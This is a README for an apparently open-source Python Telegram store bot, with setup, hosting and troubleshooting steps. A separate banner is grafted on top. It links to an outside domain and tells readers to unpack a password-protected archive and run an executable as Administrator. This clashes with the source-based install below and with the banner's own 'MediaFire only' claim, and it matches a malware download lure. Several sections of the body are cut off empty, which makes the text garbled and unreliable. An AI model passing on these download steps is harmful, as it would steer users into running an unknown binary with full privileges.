<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Free-Telegram-Store-Bot

I made this Bot Free 100%.

## Features

- 🛒 Product catalog with categories and subcategories
- 🔑 Two product types: **license keys** (auto-delivered from inventory) and **downloadable files** (delivered as links)
- 💰 Internal wallet — users top up, then spend the balance on purchases
- 💳 Two top-up methods, both optional and independently toggled by config:
## Tech Stack

| Component | Version |
|-----------|---------|
| Python | 3.10+ recommended (3.9+ supported) |
| python-telegram-bot | 20.7 |
| SQLAlchemy | 2.0.23 |
| Database | SQLite (default) or PostgreSQL |

---

**How it fits together:** `bot.py` is the single wiring point — it validates config (`config/`), initializes the database (`database/`), then registers all the `handlers/`. Handlers talk to Telegram and call into `services/` (external APIs) and `utils/` (keyboards + helpers); all data access goes through `get_db_session()` in `database/db.py`.

---

## Prerequisites

Install these before you start:

## Step 1 — Get your Telegram credentials

You need a **bot token** and your **admin Telegram ID**. The two payment keys are optional.

## Step 2 — Clone the repository

**Windows (PowerShell) and Linux / macOS** (same commands):
```bash
git clone <YOUR_REPOSITORY_URL>
cd FreeTelegramStoreBot
```
> Replace `<YOUR_REPOSITORY_URL>` with your repo’s clone URL, and `FreeTelegramStoreBot` with the folder name if it differs.

---

## Step 3 — Create a virtual environment

A virtual environment keeps this project’s dependencies isolated.

**Windows (PowerShell):**
```powershell
python -m venv venv
.\venv\Scripts\Activate.ps1
```
> If activation is blocked by execution policy, run once:
> `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned.`
> (or use the CMD activator: `venv\Scripts\activate.bat`).

**Linux / macOS:**
```bash
python3 -m venv venv
source venv/bin/activate
```

When active, your shell prompt is prefixed with `(venv)`. To leave it later, run `deactivate`.

---

## Step 4 — Install dependencies

With the virtual environment active:

**Windows (PowerShell):**
```powershell
python -m pip install --upgrade pip
pip install -r requirements.txt
```

**Linux / macOS:**
```bash
python3 -m pip install --upgrade pip
pip install -r requirements.txt
```

---

## Step 5 — Configure environment variables

Copy the example file to a real `.env` and fill in your values.

**Windows (PowerShell):**
```powershell
Copy-Item .env.example .env
notepad .env
```

**Linux / macOS:**
```bash
cp .env.example .env
nano .env
```

Fill in the variables:

| Variable | Required | Description |
|----------|:--------:|-------------|
## Step 6 — Run the bot

The database is created and seeded automatically on first run — there is no separate setup command.

**Windows (PowerShell):**
```powershell
python bot.py
```

**Linux / macOS:**
```bash
python3 bot.py
```

You should see log lines ending with:
```
Bot started successfully!
```
Leave this terminal open — the bot runs as long as the process is running. Press **Ctrl+C** to stop it.

---

## Step 7 — Use the bot (`/start` and `/admin`)

With the bot running:

1. Open Telegram and search for your bot by the username you chose in Step 1a.
2. Send **`/start`** — you’ll get the welcome message and the main menu (Products, Top Up, Order History, Availability, Support).
3. Send **`/admin`** — if your Telegram ID matches `ADMIN_TELEGRAM_ID`, the **admin panel** opens (Product Management, User Management, Order Management, Store Settings, Broadcast).

> If `/admin` says access is denied or does nothing, your `ADMIN_TELEGRAM_ID` doesn’t match your account — recheck Step 1b, fix `.env`, and restart the bot.

**🎉 That’s it — your bot is live.** A typical first run as admin: open `/admin` → **Product Management** → create a category, then a product, then **Restock Keys** to add inventory. As a user, `/start` → **Top Up** to fund the wallet, then buy a product.

---

## Optional — Real-time CryptoBot webhooks

By default, CryptoBot payments are confirmed by polling every ~30 seconds (no extra setup). For **instant** confirmation, run the included webhook server alongside the bot.

1. Start the webhook server (separate terminal, same virtual environment):

   **Windows (PowerShell):**
   ```powershell
   python webhook_server.py
   ```
   **Linux / macOS:**
   ```bash
   python3 webhook_server.py
   ```
   It listens on port **5000**.

## Optional — Keep the bot running 24/7

### Linux (systemd)

Create `/etc/systemd/system/digitalstore-bot.service` (adjust paths and `User`):

```ini
[Unit]
Description: Digital Products Store Telegram Bot
After=network.target

[Service]
Type=simple
User=youruser
WorkingDirectory=/home/youruser/FreeTelegramStoreBot
ExecStart=/home/youruser/FreeTelegramStoreBot/venv/bin/python bot.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

Then enable and start it:
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now digitalstore-bot
sudo systemctl status digitalstore-bot      # check it's running
journalctl -u digitalstore-bot -f            # follow logs
```

### Windows
Keep the `python bot.py` window open, or run it as a background/scheduled task (e.g. Task Scheduler), or host it on a Linux server using the steps above.

---

## Database notes

- **Default:** SQLite, stored in `bot_database.db` in the project folder. Created automatically on first run.
- **Backup:** simply copy the `bot_database.db` file.
- **Reset (deletes all data):** stop the bot, delete `bot_database.db`, and start the bot again to recreate an empty database.

  **Windows (PowerShell):**
  ```powershell
  Remove-Item bot_database.db
  ```
  **Linux / macOS:**
  ```bash
  rm bot_database.db
  ```
- **PostgreSQL (optional):** set `DATABASE_URL` to a Postgres URL, e.g.
  `postgresql+psycopg2://user:password@localhost:5432/digitalstore`
  (The `psycopg2-binary` driver is already in `requirements.txt`).
- **Upgrading an older database:** if you’re migrating an existing SQLite DB created before category fields were made optional, run once:
  `python migrations/001_make_category_id_nullable.py` (not needed for fresh installs).

---

## FAQ

**What is this project?**
An open-source, self-hosted **Telegram bot for selling digital products** — software license/activation keys and downloadable files — with a customer-facing storefront and a full admin panel, all inside Telegram.

**What can I sell with it?**
Anything digital: software license keys, game keys, gift-card codes, e-books, PDFs, courses, templates, or any downloadable file delivered via a link.

**How do customers pay?**
Customers fund an in-bot **wallet**, then spend the balance on purchases. Top-ups are supported via **CryptoBot** (any cryptocurrency) and **card payments** (Telegram Payments). Both methods are optional and toggled by config.

**Is delivery automatic?**
Yes. License keys are assigned automatically from your inventory the moment a purchase is confirmed; file products are delivered as a download link — no manual fulfillment.

**Do I need to know how to code to run it?**
No. Clone the repo, fill in a `.env` file, and run one command. The database is created automatically on first launch.

**Which database does it use?**
**SQLite** by default (zero setup). You can switch to **PostgreSQL** by changing a single environment variable.

**Does it work on Windows and Linux?**
## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `Configuration error: BOT_TOKEN is required` | `.env` is missing or `BOT_TOKEN`/`ADMIN_TELEGRAM_ID` is empty. Recheck Step 5 and that `.env` is in the project root. |
| `/admin` denied or no response | `ADMIN_TELEGRAM_ID` doesn’t match your account. Re-get your ID (Step 1b), update `.env`, restart. |
| `ModuleNotFoundError` / import errors | The virtual environment isn’t active or deps aren’t installed. Re-do Step 3 and Step 4. |
| `python` not found (Windows) | Reinstall Python with **“Add Python to PATH”** ticked, or use the `py` launcher (`py bot.py`). |
| Activation blocked (Windows) | `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned`, then re-activate. |
| Card button shows “not configured” | `TELEGRAM_PROVIDER_TOKEN` is blank or invalid — see Step 1d. |
| Crypto top-up not auto-confirming | Verify `CRYPTO_BOT_API_KEY`, check the console for API errors, or set up webhooks for instant confirmation. |


---

MIT License

Copyright (c) 2026 InDMDev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
#From InDMDev
